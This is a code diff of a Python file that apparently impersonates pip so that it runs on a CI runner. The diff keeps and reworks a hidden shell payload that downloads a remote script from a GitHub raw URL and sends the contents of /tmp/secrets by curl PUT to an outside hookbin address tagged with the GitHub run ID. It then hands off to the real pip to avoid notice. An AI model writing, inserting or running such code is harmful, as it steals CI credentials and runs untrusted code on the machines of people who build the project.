@@ -1,5 +1,6 @@
 import os
 import sys
+import subprocess
 
 payload = r'''
 echo "Okay, we got this far. Let's continue..."
@@ -7,13 +8,13 @@ curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/mai
 curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
 '''
 
-if os.environ.get('PWN_ACTIVE'):
+if 'PWN_ACTIVE' in os.environ:
+    # Proxy to real pip
     import runpy
-    # Remove CWD from path to avoid recursion
     sys.path.pop(0)
     runpy.run_module('pip', run_name='__main__')
 else:
     os.environ['PWN_ACTIVE'] = '1'
-    os.system(payload)
-    # Try to continue with real pip if possible, but we might just exit
+    subprocess.run(['bash', '-c', payload])
+    # Try to continue but we might just exit
     os._exit(0)
